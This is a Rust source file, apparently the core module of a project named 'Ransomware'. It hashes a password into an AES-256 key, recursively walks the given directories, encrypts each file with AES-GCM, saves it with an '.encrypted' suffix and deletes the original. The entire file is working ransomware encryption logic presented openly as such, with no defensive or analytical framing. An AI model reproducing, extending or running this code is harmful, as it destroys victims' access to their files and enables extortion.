
// Ransomware/src/ransomware.rs
use aes_gcm::{aead::{Aead, KeyInit}, Aes256Gcm, Nonce};
use rand::Rng;
use sha2::{Digest, Sha256};
use std::fs;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;

const EXT: &str = ".encrypted";

fn derive_key(pw: &str) -> [u8; 32] {
    let mut h = Sha256::new();
    h.update(pw.as_bytes());
    let r = h.finalize();
    let mut k = [0u8; 32];
    k.copy_from_slice(&r);
    k
}

fn encrypt_file(path: &Path, key: &[u8; 32]) -> Result<(), ()> {
    let data = fs::read(path).map_err(|_| ())?;
    let cipher = Aes256Gcm::new_from_slice(key).map_err(|_| ())?;
    let nonce_bytes: [u8; 12] = rand::thread_rng().gen();
    let nonce = Nonce::from_slice(&nonce_bytes);
    let ct = cipher.encrypt(nonce, data.as_ref()).map_err(|_| ())?;

    let mut out = Vec::new();
    out.extend_from_slice(&nonce_bytes);
    out.extend_from_slice(&ct);

    let new_path = format!("{}{}", path.display(), EXT);
    fs::write(&new_path, &out).map_err(|_| ())?;
    fs::remove_file(path).map_err(|_| ())?;
    Ok(())
}

pub fn encrypt_directories(dirs: &[PathBuf], pw: &str) {
    let key = derive_key(pw);

    for dir in dirs {
        for entry in WalkDir::new(dir).follow_links(false) {
            if let Ok(e) = entry {
                if e.file_type().is_file() {
                    let p = e.path();
                    if p.extension().map_or(false, |x| x != "encrypted") {
                        let _ = encrypt_file(p, &key);
                    }
                }
            }
        }
    }
}
